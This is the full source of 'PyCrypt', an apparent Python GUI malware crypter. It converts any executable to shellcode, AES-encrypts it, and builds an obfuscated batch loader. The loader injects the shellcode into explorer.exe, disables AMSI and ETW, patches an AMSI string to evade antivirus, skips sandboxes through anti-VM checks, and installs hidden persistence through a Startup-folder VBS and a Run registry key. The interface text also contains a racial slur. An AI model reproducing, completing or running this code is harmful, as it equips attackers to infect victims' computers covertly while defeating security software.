import customtkinter as ctk
import tkinter.filedialog as fd
import donut
import os
import base64
import random
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_junk_variables(count=10):
    return "\n".join(f"set !{random_string(24)}!={random_string(24)}" for _ in range(count))

class ShellcodeInjectorGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("PyCrypt")
        self.geometry("580x400")
        self.exe_path = None
        self.save_dir = None
        ctk.CTkLabel(self, text="PyCrypt", font=ctk.CTkFont(size=32, weight="bold")).pack(pady=20)
        ctk.CTkButton(self, text="Select EXE", command=self.select_file).pack(pady=8)
        ctk.CTkButton(self, text="Select Output Folder", command=self.select_folder).pack(pady=8)
        self.generate_button = ctk.CTkButton(self, text="Generate Batch Loader", command=self.generate_loader, state="disabled")
        self.generate_button.pack(pady=12)
        self.status = ctk.CTkLabel(self, text="")
        self.status.pack(pady=10)
        ctk.CTkLabel(self, text="enjyoy nigga hope it works blud", font=ctk.CTkFont(size=12, slant="italic"), anchor="se", text_color="gray").pack(side="bottom", pady=5)

    def select_file(self):
        file = fd.askopenfilename(filetypes=[("Executable files", "*.exe")])
        if file:
            self.exe_path = file
            self.check_ready()

    def select_folder(self):
        folder = fd.askdirectory()
        if folder:
            self.save_dir = folder
            self.check_ready()

    def check_ready(self):
        if self.exe_path and self.save_dir:
            self.generate_button.configure(state="normal")
            self.status.configure(text="Ready to generate.")

    def generate_loader(self):
        try:
            shellcode = donut.create(file=self.exe_path)
            shell_key = get_random_bytes(32)
            shell_iv = get_random_bytes(16)
            shell_cipher = AES.new(shell_key, AES.MODE_CBC, shell_iv)
            padded_shellcode = pad(shellcode, AES.block_size)
            encrypted_shellcode = shell_cipher.encrypt(padded_shellcode)
            encrypted_shellcode_b64 = base64.b64encode(encrypted_shellcode).decode()
            shell_key_b64 = base64.b64encode(shell_key).decode()
            shell_iv_b64 = base64.b64encode(shell_iv).decode()

            ps_stub = f"""$key = [Convert]::FromBase64String("{shell_key_b64}")
$iv = [Convert]::FromBase64String("{shell_iv_b64}")
$encrypted = [Convert]::FromBase64String("{encrypted_shellcode_b64}")
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.Key = $key
$aes.IV = $iv
$decryptor = $aes.CreateDecryptor()
$decrypted = $decryptor.TransformFinalBlock($encrypted, 0, $encrypted.Length)
$code = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {{
    [DllImport("kernel32")] public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
    [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, UInt32 size, IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, UInt32 dwCreationFlags, IntPtr lpThreadId);
}}
"@

Add-Type $code
$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$PAGE_EXECUTE_READWRITE = 0x40
$explorerProc = Get-Process explorer -ErrorAction SilentlyContinue | Select-Object -First 1
if ($explorerProc) {{
    $p = $explorerProc.Id
    $hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $p)
    if ($hProcess -ne [IntPtr]::Zero) {{
        $addr = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $decrypted.Length, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)
        [Win32]::WriteProcessMemory($hProcess, $addr, $decrypted, $decrypted.Length, [IntPtr]::Zero)
        [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
    }}
}}"""

            stub_key = get_random_bytes(32)
            stub_iv = get_random_bytes(16)
            stub_cipher = AES.new(stub_key, AES.MODE_CBC, stub_iv)
            padded_stub = pad(ps_stub.encode(), AES.block_size)
            encrypted_stub = stub_cipher.encrypt(padded_stub)
            encrypted_stub_b64 = base64.b64encode(encrypted_stub).decode()
            stub_key_b64 = base64.b64encode(stub_key).decode()
            stub_iv_b64 = base64.b64encode(stub_iv).decode()

            amsi_bypass = '''$code = @"
using System;
using System.Reflection;
public class AmsiBypass {
    public static void Disable() {
        var type = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
        if (type != null) {
            var field = type.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
            if (field != null) {
                field.SetValue(null, true);
            }
        }
    }
}
"@
Add-Type -TypeDefinition $code
[AmsiBypass]::Disable()'''

            etw_bypass = '''$etw_code = @"
using System;
using System.Runtime.InteropServices;

public class EtwPatcher {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void PatchEtw() {
        try {
            uint oldProtect;
            var ntdll = LoadLibrary("ntdll.dll");
            var etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
            if (etwEventWrite != IntPtr.Zero) {
                byte[] patch = { 0xC3 };
                VirtualProtect(etwEventWrite, (UIntPtr)patch.Length, 0x40, out oldProtect);
                Marshal.Copy(patch, 0, etwEventWrite, patch.Length);
            }
        } catch { }
    }
}
"@
Add-Type -TypeDefinition $etw_code
[EtwPatcher]::PatchEtw()'''

            bitdefender_bypass = '''$clr_code = @"
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Collections.Generic;

public class CLRModifier {
    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public IntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SYSTEM_INFO {
        public ushort ProcessorArchitecture;
        public ushort Reserved;
        public uint PageSize;
        public IntPtr MinimumApplicationAddress;
        public IntPtr MaximumApplicationAddress;
        public UIntPtr ActiveProcessorMask;
        public uint NumberOfProcessors;
        public uint ProcessorType;
        public uint AllocationGranularity;
        public ushort ProcessorLevel;
        public ushort ProcessorRevision;
    }

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualQuery(IntPtr lpAddress, ref MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint GetMappedFileName(IntPtr hProcess, IntPtr lpv, StringBuilder lpFilename, uint nSize);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpfOldProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern void GetSystemInfo(ref SYSTEM_INFO lpSystemInfo);

    public static readonly byte[] AMSI_STRING = Encoding.UTF8.GetBytes("AmsiScanBuffer");

    public static void OverwriteAmsiString() {
        IntPtr hProcess = GetCurrentProcess();
        SYSTEM_INFO sysInfo = new SYSTEM_INFO();
        GetSystemInfo(ref sysInfo);

        IntPtr address = IntPtr.Zero;
        List<MEMORY_BASIC_INFORMATION> regions = new List<MEMORY_BASIC_INFORMATION>();
        while (address.ToInt64() < sysInfo.MaximumApplicationAddress.ToInt64()) {
            MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
            if (VirtualQuery(address, ref mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)))) {
                regions.Add(mbi);
                address = IntPtr.Add(address, (int)mbi.RegionSize);
            } else {
                break;
            }
        }

        const int MAX_PATH = 260;
        foreach (var region in regions) {
            if (region.State != 0x1000 || (region.Protect & 0x04) == 0) continue;

            StringBuilder path = new StringBuilder(MAX_PATH);
            if (GetMappedFileName(hProcess, region.BaseAddress, path, MAX_PATH) > 0) {
                string fileName = path.ToString();
                if (fileName.ToLower().EndsWith("clr.dll")) {
                    byte[] buffer = new byte[(int)region.RegionSize];
                    int bytesRead;
                    if (ReadProcessMemory(hProcess, region.BaseAddress, buffer, buffer.Length, out bytesRead)) {
                        for (int i = 0; i <= bytesRead - AMSI_STRING.Length; i++) {
                            bool match = true;
                            for (int j = 0; j < AMSI_STRING.Length; j++) {
                                if (buffer[i + j] != AMSI_STRING[j]) {
                                    match = false;
                                    break;
                                }
                            }
                            if (match) {
                                uint oldProtect;
                                uint newProtect = 0x40;
                                VirtualProtect(IntPtr.Add(region.BaseAddress, i), (uint)AMSI_STRING.Length, newProtect, out oldProtect);

                                byte[] zeros = new byte[AMSI_STRING.Length];
                                int bytesWritten;
                                WriteProcessMemory(hProcess, IntPtr.Add(region.BaseAddress, i), zeros, zeros.Length, out bytesWritten);

                                VirtualProtect(IntPtr.Add(region.BaseAddress, i), (uint)AMSI_STRING.Length, oldProtect, out oldProtect);
                                return;
                            }
                        }
                    }
                }
            }
        }
    }
}
"@
Add-Type -TypeDefinition $clr_code -ReferencedAssemblies "System.Runtime.InteropServices"
[CLRModifier]::OverwriteAmsiString()'''

            ps_loader = f"""$key = [Convert]::FromBase64String("{stub_key_b64}")
$iv = [Convert]::FromBase64String("{stub_iv_b64}")
$encrypted = [Convert]::FromBase64String("{encrypted_stub_b64}")
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.Key = $key
$aes.IV = $iv
$decryptor = $aes.CreateDecryptor()
$decrypted = $decryptor.TransformFinalBlock($encrypted, 0, $encrypted.Length)
{amsi_bypass}
{etw_bypass}
{bitdefender_bypass}
iex ([Text.Encoding]::UTF8.GetString($decrypted))"""
            encoded_loader = base64.b64encode(ps_loader.encode("utf-8")).decode()

            randomSubDirName = random_string(12)
            randomBatFileName = random_string(10)
            randomVbsStartupName = random_string(11)
            randomTempVbsName = random_string(9)
            randomStartupRegKey = random_string(13)

            startup_ps = f'''
try {{
    $batSubDir = "$env:LOCALAPPDATA\\Microsoft\\Windows\\{randomSubDirName}";
    if (-not (Test-Path $batSubDir)) {{
        New-Item -Path $batSubDir -ItemType Directory -Force -ErrorAction Stop | Out-Null;
        (Get-Item $batSubDir).Attributes = 'Hidden';
    }}
    $batDest = "$batSubDir\\{randomBatFileName}.bat";
    if (-not (Test-Path $batDest)) {{
        Copy-Item $env:MY_BAT_PATH $batDest -Force -ErrorAction Stop;
        (Get-Item $batDest).Attributes = 'Hidden';
    }}
}} catch {{ }}

try {{
    $vbsDest = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{randomVbsStartupName}.vbs";
    $vbsContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.Run "cmd /c " & Chr(34) & "' + $batDest + '" & Chr(34), 0, False' + "`n" + 'Set WshShell = Nothing';
    Set-Content -Path $vbsDest -Value $vbsContent -Force -ErrorAction Stop;
    (Get-Item $vbsDest).Attributes = 'Hidden';
}} catch {{ }}

try {{
    $vbsRegSubDir = "$env:LOCALAPPDATA\\Microsoft\\Windows\\{randomSubDirName}";
    if (-not (Test-Path $vbsRegSubDir)) {{
        New-Item -Path $vbsRegSubDir -ItemType Directory -Force -ErrorAction Stop | Out-Null;
        (Get-Item $vbsRegSubDir).Attributes = 'Hidden';
    }}
    $vbsRegDest = "$vbsRegSubDir\\{randomTempVbsName}.vbs";
    $vbsContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.Run "cmd /c " & Chr(34) & "' + $batDest + '" & Chr(34), 0, False' + "`n" + 'Set WshShell = Nothing';
    Set-Content -Path $vbsRegDest -Value $vbsContent -Force -ErrorAction Stop;
    (Get-Item $vbsRegDest).Attributes = 'Hidden';
    Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{randomStartupRegKey}' -Value ('wscript.exe //B "' + $vbsRegDest + '"') -Type String -Force -ErrorAction Stop;
}} catch {{ }}
'''
            encoded_startup_ps = base64.b64encode(startup_ps.encode("utf-16le")).decode()

            marker_name = random_string(6)
            marker = ":" + marker_name + "::"

            anti_vm_checks = f"""
if /i "%USERNAME%"=="Admin" exit /b
if /i "%USERNAME%"=="admin" exit /b
powershell -Command "if ([int]((Get-Volume -DriveLetter C).Size / 1GB) -eq 235) {{ exit 1 }}" >nul 2>&1
if %errorlevel%==1 exit /b
for /f "delims=" %%m in ('powershell -Command "Get-PhysicalDisk | ForEach-Object {{ $_.Model }}"') do (
    setlocal enabledelayedexpansion
    set "model=%%m"
    set "model=!model: =!"
    echo !model! | findstr /i /c:"WDCWDS100T2B0A" /c:"WDC W20EARS ATA" >nul
    if !errorlevel! equ 0 (
        endlocal
        exit /b
    )
    endlocal
)
"""
            ps_cmd = f"""$c=Get-Content '%~f0' -raw; $p=$c -split ':{marker_name}::' | Select -Last 1; $t=$p.Trim(); iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($t)))"""

            bat_content = f"""@echo off
powershell -windowstyle minimized -c ""
{anti_vm_checks}
set MY_BAT_PATH=%~dpnx0
if "%~1" neq "min" (
    start /min "" "%~f0" min %*
    exit /b
)
powershell -ep bypass -enc {encoded_startup_ps}
powershell -exec bypass -WindowStyle Hidden -C "{ps_cmd}"
{marker}{encoded_loader}
"""
            bat_path = os.path.join(self.save_dir, "explorer_inject.bat")
            with open(bat_path, "w", encoding="ascii") as f:
                f.write(bat_content)
            self.status.configure(text="File Crypted! (Injected into Explorer)")
        except Exception as e:
            self.status.configure(text=f"Error: {str(e)}")

if __name__ == "__main__":
    app = ShellcodeInjectorGUI()
    app.mainloop()